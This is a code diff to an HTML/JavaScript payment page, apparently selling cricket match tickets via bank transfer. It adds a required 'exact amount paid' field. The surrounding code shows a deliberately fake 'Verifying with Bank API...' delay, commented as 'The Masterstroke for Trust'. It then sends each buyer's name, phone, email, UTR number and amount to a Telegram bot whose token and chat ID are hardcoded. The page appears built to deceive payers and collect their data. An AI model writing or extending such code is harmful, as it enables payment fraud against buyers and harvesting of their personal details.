@@ -75,10 +75,10 @@
         .floating-input:focus, .floating-input:not(:placeholder-shown) { border-color: #0052FF; background: #fff; box-shadow: 0 0 0 4px rgba(0, 82, 255, 0.1); }
         .floating-input:focus ~ .floating-label, .floating-input:not(:placeholder-shown) ~ .floating-label { top: 6px; font-size: 11px; color: #0052FF; font-weight: 700; letter-spacing: 0.5px; }
         
-        .error-msg { color: #ef4444; font-size: 12px; margin-top: 8px; display: none; font-weight: 600; display: flex; align-items: center; gap: 5px;}
+        .error-msg { color: #ef4444; font-size: 12px; margin-top: 8px; margin-bottom: 10px; display: none; font-weight: 600; align-items: center; gap: 5px;}
 
         /* Modern Pay Button */
-        .pay-now-btn { width: 100%; padding: 18px; background: #cbd5e1; color: #fff; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: not-allowed; transition: all 0.3s ease; display: flex; justify-content: center; align-items: center; gap: 10px; }
+        .pay-now-btn { width: 100%; padding: 18px; background: #cbd5e1; color: #fff; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: not-allowed; transition: all 0.3s ease; display: flex; justify-content: center; align-items: center; gap: 10px; margin-top: 10px;}
         .pay-now-btn.active { background: #00cf7f; cursor: pointer; box-shadow: 0 8px 20px rgba(0, 207, 127, 0.3); }
         .pay-now-btn.active:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(0, 207, 127, 0.4); }
         .pay-now-btn.loading { background: #0052FF; cursor: wait; pointer-events: none; }
@@ -142,13 +142,23 @@
 
         <div class="utr-box">
             <div class="floating-group">
-                <input type="number" id="utr" class="floating-input" placeholder=" " oninput="checkUTR()">
+                <input type="number" id="utr" class="floating-input" placeholder=" " oninput="checkInputs()">
                 <label class="floating-label">Enter Bank UTR / Reference No.</label>
             </div>
             
             <div id="utr-error" class="error-msg">
                 <svg width="14" height="14" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
                 Invalid Bank UTR! Please check again.
+            </div>
+
+            <div class="floating-group">
+                <input type="number" id="paid-amt" class="floating-input" placeholder=" " oninput="checkInputs()">
+                <label class="floating-label">Enter Exact Amount Paid (₹)</label>
+            </div>
+
+            <div id="amt-error" class="error-msg">
+                <svg width="14" height="14" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
+                Amount mismatch! Please enter the exact amount shown above.
             </div>
 
             <button id="pay-btn" class="pay-now-btn" disabled onclick="submitPayment()">
@@ -204,17 +214,26 @@
             }
         }
 
-        // --- UTR VALIDATION LOGIC ---
-        function checkUTR() {
-            const val = document.getElementById('utr').value;
+        // --- NEW SECURE VALIDATION LOGIC ---
+        function checkInputs() {
+            const utrVal = document.getElementById('utr').value;
+            const amtVal = document.getElementById('paid-amt').value;
             const btn = document.getElementById('pay-btn');
-            const errorMsg = document.getElementById('utr-error');
+            
             const utrInput = document.getElementById('utr');
+            const amtInput = document.getElementById('paid-amt');
 
-            errorMsg.style.display = 'none';
+            // Reset errors visually
+            document.getElementById('utr-error').style.display = 'none';
+            document.getElementById('amt-error').style.display = 'none';
             utrInput.style.borderColor = '#0052FF';
+            
+            // Only make amount box blue if user is typing
+            if(amtVal.length > 0) amtInput.style.borderColor = '#0052FF';
+            else amtInput.style.borderColor = '#e2e8f0';
 
-            if(val.length > 5) {
+            // Button is enabled only if BOTH fields have data
+            if(utrVal.length > 5 && amtVal.length > 0) {
                 btn.disabled = false;
                 btn.classList.add('active');
             } else {
@@ -225,27 +244,45 @@
 
         function submitPayment() {
             const val = document.getElementById('utr').value;
-            const errorMsg = document.getElementById('utr-error');
+            const enteredAmt = document.getElementById('paid-amt').value;
+            
+            const errorMsgUtr = document.getElementById('utr-error');
+            const errorMsgAmt = document.getElementById('amt-error');
+            
             const utrInput = document.getElementById('utr');
+            const amtInput = document.getElementById('paid-amt');
+            
             const btn = document.getElementById('pay-btn');
             const btnLoader = document.getElementById('btn-loader');
             const btnText = document.getElementById('btn-text');
 
-            // 🔥 SMART ANTI-FRAUD UTR CHECK 🔥
-            let isFake = false;
-            if(val.length !== 12) isFake = true;
-            else if(val.startsWith('0')) isFake = true;
-            else if(/^(\d)\1{11}$/.test(val)) isFake = true;
-            else if(val === '123456789012' || val === '098765432109' || val === '123451234512') isFake = true;
+            // 🔥 1. Check if UTR is Fake
+            let isUtrFake = false;
+            if(val.length !== 12) isUtrFake = true;
+            else if(val.startsWith('0')) isUtrFake = true;
+            else if(/^(\d)\1{11}$/.test(val)) isUtrFake = true;
+            else if(val === '123456789012' || val === '098765432109' || val === '123451234512') isUtrFake = true;
 
-            if(isFake) {
-                errorMsg.style.display = 'flex';
+            // 🔥 2. Check if Amount matches Exactly
+            let isAmtFake = false;
+            if(enteredAmt != finalPrice) isAmtFake = true;
+
+            // Display Errors
+            if(isUtrFake) {
+                errorMsgUtr.style.display = 'flex';
                 utrInput.style.borderColor = '#ef4444';
-            } else {
-                errorMsg.style.display = 'none';
+            } 
+            else if(isAmtFake) {
+                errorMsgAmt.style.display = 'flex';
+                amtInput.style.borderColor = '#ef4444';
+            } 
+            else {
+                // ALL GOOD - PROCEED!
+                errorMsgUtr.style.display = 'none';
+                errorMsgAmt.style.display = 'none';
                 localStorage.setItem('userUTR', val); 
 
-                // ⏳ FAKE API DELAY (The Masterstroke for Trust)
+                // ⏳ FAKE API DELAY
                 btn.classList.remove('active');
                 btn.classList.add('loading');
                 btnText.innerText = "Verifying with Bank API...";
@@ -254,7 +291,7 @@
                 setTimeout(() => {
                     // --- ✈️ TELEGRAM UTR ALERT ---
                     const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
-                    const chatId = "6820660513"; // 👈 YAHAN APNI CHAT ID DAALEIN
+                    const chatId = "6820660513"; 
                     
                     const name = localStorage.getItem('customerName') || 'N/A';
                     const phone = localStorage.getItem('customerPhone') || 'N/A';
@@ -263,7 +300,8 @@
 
                     const telegramMsg = `💰 *PAYMENT SUBMITTED!* 💰%0A%0A` +
                                         `🏏 *Match:* ${matchTitle}%0A` +
-                                        `💵 *Amount:* ₹${finalPrice}%0A` +
+                                        `💵 *System Amount:* ₹${finalPrice}%0A` +
+                                        `💸 *Entered Amount:* ₹${enteredAmt}%0A` +
                                         `👤 *Name:* ${name}%0A` +
                                         `📞 *Phone:* ${phone}%0A` +
                                         `📧 *Email:* ${email}%0A` +
@@ -278,7 +316,7 @@
                         window.location.href = 'processing.html'; 
                     });
 
-                }, 2500); // 2.5 seconds validation loading illusion
+                }, 2500); 
             }
         }
     </script>
@@ -326,4 +364,3 @@
 
 </body>
 </html>
-
